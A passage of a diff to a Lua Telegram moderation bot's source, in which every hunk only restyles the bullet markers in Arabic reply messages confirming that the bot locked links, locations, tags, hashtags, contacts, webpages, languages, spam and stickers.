-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4502,14 +4205,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الروابط `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الروابط `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:links:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4518,14 +4221,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الروابط `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الروابط `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:links:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الروابط` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4534,14 +4237,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشبكات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشبكات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:location:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4550,14 +4253,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشبكات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشبكات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:location:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4566,14 +4269,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> location ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشبكات `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشبكات `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:location:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> location warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشبكات` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4582,14 +4285,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المعرفات <@> `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المعرفات <@> `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:tag:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4598,14 +4301,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المعرفات <@> `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المعرفات <@> `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:tag:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4614,14 +4317,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tag ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المعرفات <@> `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المعرفات <@> `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:tag:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tag warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المعرفات <@>` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4630,14 +4333,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التاكات <#> `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التاكات <#> `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:hashtag:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4646,14 +4349,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التاكات <#> `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التاكات <#> `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:hashtag:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4662,14 +4365,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> hashtag ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التاكات <#> `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التاكات <#> `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:hashtag:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> hashtag warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التاكات <#>` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4678,14 +4381,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل جهات الاتصال `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل جهات الاتصال `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:contact:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4694,14 +4397,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل جهات الاتصال `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل جهات الاتصال `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:contact:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4710,14 +4413,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> contact ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل جهات الاتصال `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل جهات الاتصال `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:contact:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> contact warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل جهات الاتصال` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4726,14 +4429,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المواقع `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المواقع `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:webpage:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4742,14 +4445,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المواقع `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المواقع `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:webpage:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4758,14 +4461,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> webpage ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المواقع `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المواقع `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:webpage:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> webpage warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المواقع` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
     end
@@ -4774,14 +4477,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل العربيه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل العربيه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:arabic:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4790,14 +4493,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل العربيه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل العربيه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:arabic:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4806,14 +4509,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل العربيه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل العربيه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:arabic:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل العربيه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4822,14 +4525,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانكليزيه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانكليزيه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:english:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4838,14 +4541,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانكليزيه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانكليزيه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:english:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4854,14 +4557,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانكليزيه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانكليزيه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:english:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانكليزيه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4870,14 +4573,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> spam has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الكلايش `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الكلايش `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:spam:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> spam is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الكلايش` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الكلايش` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4886,14 +4589,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> spam ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الكلايش `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الكلايش `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:spam:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> spam warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الكلايش` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الكلايش` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4902,14 +4605,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملصقات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملصقات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:sticker:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4918,14 +4621,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملصقات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملصقات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:sticker:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4934,14 +4637,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملصقات `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملصقات `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:sticker:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملصقات` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
     end
@@ -4950,14 +4653,14 @@ end
